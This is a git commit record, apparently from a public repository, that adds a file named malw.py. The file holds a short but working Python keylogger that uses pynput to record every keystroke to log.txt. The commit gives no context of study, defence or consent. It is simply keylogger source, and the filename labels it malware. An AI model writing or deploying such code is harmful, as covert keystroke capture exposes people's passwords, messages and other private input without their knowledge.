df26e08858d305f308f509faf56b897ee03b0036
HassanTike <160068589+HassanTike@users.noreply.github.com>
2024-06-13 09:48:33 +0530

    Add files via upload

---
+++ malw.py
@@ -0,0 +1,9 @@
+import pynput
+from pynput.keyboard import Listener
+def on_press(key):
+    with open('log.txt', 'a') as f:
+        f.write(str(key)+'\n')
+
+with Listener(on_press=on_press) as Listener:
+    Listener.join()
+        
